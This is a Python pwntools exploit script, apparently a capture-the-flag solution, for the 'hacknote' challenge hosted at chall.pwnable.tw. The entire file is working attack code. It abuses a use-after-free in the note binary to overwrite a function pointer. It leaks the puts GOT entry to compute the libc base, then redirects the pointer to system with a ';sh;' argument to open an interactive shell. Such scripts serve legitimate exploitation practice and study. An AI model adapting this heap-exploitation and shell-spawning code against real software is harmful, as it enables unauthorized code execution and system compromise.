from pwn import *

HOST = 'chall.pwnable.tw'
PORT = '10102'

#context.log_level='debug'

#s = process('./hacknote', env = {'LD_PRELOAD':'./libc.so.6'})
s = remote(HOST, PORT)

elf = ELF('./hacknote')
libc = ELF('./libc.so.6')

fptr = 0x0804862B
puts_got = elf.got['puts']
puts_off = libc.symbols['puts']
system_off = libc.symbols['system']


def Add(note = '', size = 40):
	s.sendlineafter('choice :', '1')
	s.sendlineafter('size :', str(size))
	s.sendlineafter('Content :', note)

def Del(idx):
	s.sendlineafter('choice :', '2')
	s.sendlineafter('Index :', str(idx))

def Prn(idx):
	s.sendlineafter('choice :', '3')
	s.sendlineafter('Index :', str(idx))
	

raw_input('===============press===============')
Add()
Add()
Del(0)
Del(1)

Add(p32(fptr) + p32(puts_got), 8)
Prn(0)
puts_addr = u32(s.recv(4))
libc_base = puts_addr - puts_off
system_addr = libc_base + system_off
log.info('puts_addr   : ' + hex(puts_addr))
log.info('libc_base   : ' + hex(libc_base))
log.info('system_addr : ' + hex(system_addr)) 

#raw_input('===============press===============')
Del(2)
Add(p32(system_addr)+';sh;', 8)
#raw_input('===============press===============')
Prn(0)
raw_input('===============press===============')

s.interactive()